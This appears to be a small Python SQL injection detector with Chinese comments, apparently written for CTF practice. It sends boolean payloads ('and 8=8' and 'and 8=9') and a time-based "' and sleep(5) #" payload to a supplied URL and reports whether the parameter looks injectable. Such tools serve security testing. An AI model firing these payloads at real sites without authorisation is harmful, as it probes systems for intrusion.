# -*- coding: utf-8 -*
import sys
import time
import difflib
import requests
from multiprocessing import Pool

'''
支持参数输入，示例：python SQL.py http://111.198.29.45:43529/?inject=1
注意：请自行发现注入点或用awvs扫描注入点
只写了布尔注入和时间注入检测
'''
class sqlmap(object):

    def __init__(self,url):
        self.url = url
        self.flag = True

    def run(self):
        if self.check():
            results = []
            pool = Pool(processes=2)
            results.append(pool.apply_async(self.bool, ()))
            results.append(pool.apply_async(self.sleep, ()))
            pool.close()
            pool.join()
            for res in results:
                if res.get() == 'YES':
                    self.flag = False
                    print('SQL injection is possible')
                    sys.stdout.flush()
                    break
                if res.get() == 'NULL':
                    self.flag = False
                    print('The host is unreachable')
                    sys.stdout.flush()
                    break
            if self.flag:
                print('SQL injection is impossible')
                sys.stdout.flush()
        else:
            print ('Injection point wasn\'t found')


    def check(self):
        if '://' not in self.url:
            self.url = 'http://' + self.url
        if '=' not in self.url:
            return False
        return True

    def bool(self): #布尔注入
        try:
            payload_right = " %20%61%4e%64%20%38%3d%38" # and 1=1
            payload_wrong = " %20%61%4e%64%20%38%3d%39" # and 1=2
            r =  requests.get(self.url + payload_right)
            w = requests.get(self.url + payload_wrong)
            right = r.content
            wrong = w.content
            if difflib.SequenceMatcher(None,right,wrong).quick_ratio() < 0.8: # 页面相似度判定
                return 'YES'
            else:
                return 'NO'
        except:
            return 'NULL'

    def sleep(self): #时间注入：二次请求，减少网络质量的误差
        try:
            payload = "' and sleep(5) %23"
            start_time = time.time()
            requests.get(self.url)
            end_time = time.time()
            first = end_time - start_time
            start__time = time.time()
            requests.get(self.url + payload)
            end__time = time.time()
            last = end__time - start__time
            if last - first > 4.5:
                return 'YES'
            else:
                return 'NO'
        except:
            return 'NULL'